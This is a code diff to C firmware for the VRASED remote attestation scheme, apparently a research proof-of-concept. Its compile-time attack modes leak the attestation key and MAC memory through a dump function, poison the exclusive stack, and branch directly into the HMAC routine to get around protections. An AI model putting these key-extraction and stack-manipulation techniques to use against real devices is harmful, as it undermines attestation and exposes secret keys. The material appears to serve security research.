@@ -12,7 +12,7 @@
 #define ATTEST_DATA_ADDR 0xE000
 #define ATTEST_SIZE 0x20
 
-/* Fields for VRASED_A, in unprotected DMEM for our PoC */
+/* Fields for VRASED_A */
 #define CTR_ADDR 0x0270
 #define VRF_AUTH 0x0250
 
@@ -143,9 +143,9 @@ void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
   for(i=0; i<size; i++) dst[i] = src[i];
 }
 
-void leak_key(uint8_t *buf, int start, int end)
+void dump_buf(char *name, uint8_t *buf, int start, int end)
 {
-    printf("leak[%d:%d]: ", start, end-1);
+    printf("%s[%d:%d]: ", name, start, end-1);
 
     for (int i = start; i < end; i++)
         printf("%02x", *(buf+i));
@@ -181,7 +181,8 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);
 
     #if __ATTACK == 1
-      leak_key((uint8_t*) KEY_ADDR, 31, 64);
+      if (!have_reset)
+        dump_buf("leak", (uint8_t*) KEY_ADDR, 31, 64);
       return;
     #endif
 
@@ -192,13 +193,13 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
           "  nop \n"
           ".ENDR \n"
       );
-      leak_key((uint8_t*) MAC_ADDR, 0, 64);
+      dump_buf("leak", (uint8_t*) MAC_ADDR, 0, 64);
       return;
     #endif
 
     #if __ATTACK == 3
       if (have_reset) {
-        leak_key((uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
+        dump_buf("leak", (uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
         return;
       } else {
         printf("First run\n");
@@ -206,9 +207,8 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
-      /* Initializing the counter address for demonstration purposes; normally this
-         would also be protected (but its value is known to the attacker) */
-      my_memset((uint8_t*) CTR_ADDR, 32, 0);
+      //if (!have_reset)
+      //  dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, 32);
 
       my_memset((uint8_t*) VRF_AUTH, 32, 0);
       uint8_t * verification = (uint8_t*) VRF_AUTH;
@@ -319,7 +319,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     // Write return address of Hacl_HMAC_SHA2_256_hmac_entry
     // to RAM:
-    __asm__ volatile("mov    #0x000e,   r6" "\n\t");
+    __asm__ volatile("mov    #0x0010,   r6" "\n\t");
     __asm__ volatile("mov    #0x0300,   r5" "\n\t");
     __asm__ volatile("mov    r0,        @(r5)" "\n\t");
     __asm__ volatile("add    r6,        @(r5)" "\n\t");
@@ -329,14 +329,14 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     // Set the stack pointer to the base of the exclusive stack:
     #if __ATTACK == 3
-      /* NOTE: call will do a 2-byte push, hence desired address + 2 */
-      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS + 2) ",     r1" "\n\t");
+      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS) ",     r1" "\n\t");
     #else
-      __asm__ volatile("mov    #0x1002,     r1" "\n\t");
+      __asm__ volatile("mov    #0x1000,     r1" "\n\t");
     #endif
 
     // Call SW-Att:
-    Hacl_HMAC_SHA2_256_hmac_entry();
+    __asm__ volatile ("nop\n\t"); /* timing alignment */
+    __asm__ volatile ("br #Hacl_HMAC_SHA2_256_hmac_entry\n\t");
 
     // Copy retrieve the original stack pointer value:
     __asm__ volatile("mov    r5,    r1" "\n\t");
